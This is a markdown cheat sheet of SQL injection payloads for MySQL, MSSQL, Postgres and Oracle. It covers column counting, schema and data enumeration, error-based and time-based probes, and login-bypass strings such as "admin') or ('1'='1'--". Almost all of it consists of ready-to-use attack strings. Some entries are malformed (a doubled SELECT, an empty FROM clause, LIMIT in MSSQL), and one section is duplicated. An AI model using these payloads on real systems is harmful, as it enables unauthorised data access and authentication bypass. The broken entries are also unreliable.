# SQL Injection Payloads

## Number of Columns
- MySQL/MSSQL/PGSQL: `'UNION SELECT NULL,NULL,NULL -- -`
- ORACLE: `'UNION SELECT NULL,NULL,NULL FROM DUAL -- -`
- MYSQL/MSSQL/PGSQL/ORACLE - (add +1 until you get an exception): `' UNION ORDER BY 1 -- -`

## Database Enumeration
- MySQL/MSSQL: `' UNION SELECT @@version -- -`
- Oracle: `' UNION SELECT banner from v$version -- -`
- Oracle (2nd method): `' UNION SELECT version from v$instance -- -`
- Postgres: `' UNION SELECT version() -- -`

## Tablename Enumeration
- MySQL/MSSQL/Postgres: `' UNION SELECT table_name,NULL from INFORMATION_SCHEMA.TABLES -- -`
- Oracle: `' UNION SELECT table_name,NULL FROM all_tables  -- -`

## Column Name Enumeration
- MySQL/MSSQL/Postgres: `' UNION SELECT column_name,NULL from INFORMATION_SCHEMA.COLUMNS where table_name="X" -- -`
- Oracle: `' UNION SELECT column_name,NULL FROM all_tab_columns where table_name="X"  -- -`

## Column Values Concatenation
- MySQL/Postgres: `' UNION SELECT concat(col1,':',col2) from table_name limit 1 -- -`
- MySQL (2nd method): `' UNION SELECT col1 ':' col2 from table_name limit 1 -- -`
- Oracle/Postgres: `' UNION SELECT select col1 ||':'||col2, null FROM  where table_name="X"  -- -`
- MSSQL: `' UNION SELECT col1+':'+col2,NULL from table_name limit 1 -- -`

## Conditional (Error Based)
- MySQL: `' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -`
- Postgres: `' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -`
- Oracle: `' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -`
- MSSQL: `' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -`

## Time-Based
- `(select * from (select(sleep(10)))a)`
- `';WAITFOR DELAY '0:0:30'--`

## Generic Error Based Payloads
- MySQL: `' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -`
- Postgres: `' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -`
- Oracle: `' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -`
- MSSQL: `' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -`

## Authentication Based Payloads
- `or true--`
- `") or true--`
- `') or true--`
- `admin') or ('1'='1'--`
- `admin') or ('1'='1'#`
- `admin') or ('1'='1'/`

## Order by and UNION Based Payloads
- `1' ORDER BY 1--+`
- `1' ORDER BY 2--+`
- `1' ORDER BY 3--+`
- `1' ORDER BY 1,2--+`
- `1' ORDER BY 1,2,3--+`
- `1' GROUP BY 1,2,--+`
- `1' GROUP BY 1,2,3--+`
- `' GROUP BY columnnames having 1=1 --`
- `-1' UNION SELECT 1,2,3--+`
- `' UNION SELECT sum(columnname ) from tablename --`
- `-1 UNION SELECT 1 INTO @,@`
- `-1 UNION SELECT 1 INTO @,@,@`
- `1 AND (SELECT * FROM Users) = 1`
- `' AND MID(VERSION(),1,1) = '5';`
- `' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --`
